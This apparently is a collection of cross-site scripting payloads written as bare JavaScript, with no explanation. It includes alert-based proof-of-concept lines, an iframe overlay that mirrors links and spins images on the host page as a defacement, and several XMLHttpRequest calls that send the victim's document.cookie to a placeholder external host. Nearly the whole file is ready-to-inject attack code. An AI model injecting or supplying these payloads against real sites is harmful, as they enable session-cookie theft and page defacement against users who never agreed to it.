

document.write('<style type="text/css">body{padding); margin:0}</style>');
document.write('<iframe id="iwonder_hack" src="//' + location.host + '/" width="100%" height="100%" style="border:0;padding:0;margin:0"></iframe>');

//
//

alert(document.domain);

//
//

var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'https://some-example-where-data-could-go.com/'); 
xhr.open('GET', 'https://some-example-where-data-could-go.com?cookie=' + document.cookie); 
xhr.send();

//
//

var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'https://some-example-where-data-could-go.com?cookie=' + document.cookie); 
xhr.send();

//
//

document.write('<style type="text/css">body{padding); margin:0}</style>');
document.write('<iframe id="iwonder_hack" src="//' + location.host + '/" width="100%" height="100%" style="border:0;padding:0;margin:0"></iframe>');
setTimeout(function(){
    var frmdoc = document.getElementsByTagName('iframe')[0].contentWindow.document
        ,rotation = 0
        ,links = frmdoc.getElementsByTagName('a')
        ,images = frmdoc.getElementsByTagName('img')
        ,props = ['transform', 'WebkitTransform', 'msTransform', 'MozTransform', 'OTransform']
        ,transform = function(elem, trans) {
        for (var i = 0; i < props.length; i++) {
            if (typeof elem.style[props[i]] != "undefined") {
                elem.style[props[i]] = trans;
                return;
            }
        }
    };
    for (var i = links.length - 1; i >= 0; i--) {
        links[i].style.display = 'inline-block';
        transform(links[i], 'scaleX(-1)');
    }
    setInterval(function() {
        rotation++;
        for (var i = images.length - 1; i >= 0; i--) {
            transform(images[i], 'rotate(-' + (rotation) +'deg)');
        }
    }, 50);
}, 1000);

//
//

alert("XSS Vulnerability");
alert(document.cookie);
var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'https://some-example-where-data-could-go.com/'); 
xhr.send();
